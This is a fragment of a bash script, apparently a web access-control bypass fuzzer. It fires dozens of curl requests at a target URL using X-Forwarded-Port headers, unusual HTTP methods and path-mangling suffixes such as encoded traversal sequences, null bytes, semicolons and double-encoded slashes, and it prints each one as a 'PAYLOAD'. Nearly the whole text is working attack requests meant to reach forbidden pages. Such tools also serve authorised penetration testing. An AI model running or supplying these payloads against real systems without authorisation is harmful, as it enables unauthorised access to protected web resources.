	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Forwarded-Port: 80' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Forwarded-Port: 8080' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks -H 'X-Forwarded-Port: 8443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X GET)

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X GET\n${end}")
	print

	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X POST)

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X POST\n${end}")
	print

	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X HEAD)

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X HEAD\n${end}")
	print

	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X OPTIONS)

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X OPTIONS\n${end}")
	print

	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X PUT)

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X PUT\n${end}")
	print

	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X TRACE)

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X TRACE\n${end}")
	print

	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X PATCH)

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X PATCH\n${end}")
	print

	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X TRACK)

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X TRACK\n${end}")
	print

	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X CONNECT)

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X CONNECT\n${end}")
	print

	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X UPDATE)

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X UPDATE\n${end}")
	print

	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X LOCK)

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X LOCK\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}#?" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}#?' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%09" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%09' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%09%3b" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%09%%%%3b' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%09.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%09..' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%09;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%09;' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%20" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%20' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%23%3f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%23%%%%3f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%252f%252f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%252f%%%%252f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%252f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%252f/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2e%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%2e%%%%2e' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2e%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%2e%%%%2e/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%20%23" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%2f%%%%20%%%%23' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%23" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%2f%%%%23' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%3b%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%2f%%%%3b%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%3b%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%2f%%%%3b%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%3f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%2f%%%%3f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%3f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%2f%%%%3f/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%2f/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%3b' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b%09" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%3b%%%%09' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b%2f%2e%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%3b%%%%2f%%%%2e%%%%2e' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b%2f%2e%2e%2f%2e%2e%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%3b%%%%2f%%%%2e%%%%2e%%%%2f%%%%2e%%%%2e%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b%2f%2e." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%3b%%%%2f%%%%2e.' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b%2f.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%3b%%%%2f..' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b/%2e%2e/..%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%3b/%%%%2e%%%%2e/..%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b/%2e." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%3b/%%%%2e.' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b/%2f%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%3b/%%%%2f%%%%2f../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b/.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%3b/..' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b//%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%3b//%%%%2f../' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3f%23" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%3f%%%%23' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3f%3f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}%%%%3f%%%%3f' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%00/;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..%%%%00/;' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%00;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..%%%%00;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%09" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..%%%%09' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%0d/;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..%%%%0d/;' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%0d;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..%%%%0d;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%5c/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..%%%%5c/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%ff/;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..%%%%ff/;' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%ff;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..%%%%ff;/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;%00/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..;%%%%00/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;%0d/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..;%%%%0d/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;%ff/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..;%%%%ff/' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;\\" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..;\\\\\\\' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;\;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..;\;' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..\;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}..\;' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%20#" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%20#' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%20%23" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

	payload=$(printf "${cyan}PAYLOAD:${end} ${green}curl -k -s '${target}/%%%%20%%%%23' -H 'User-Agent: Mozilla/5.0'\n${end}")
	print

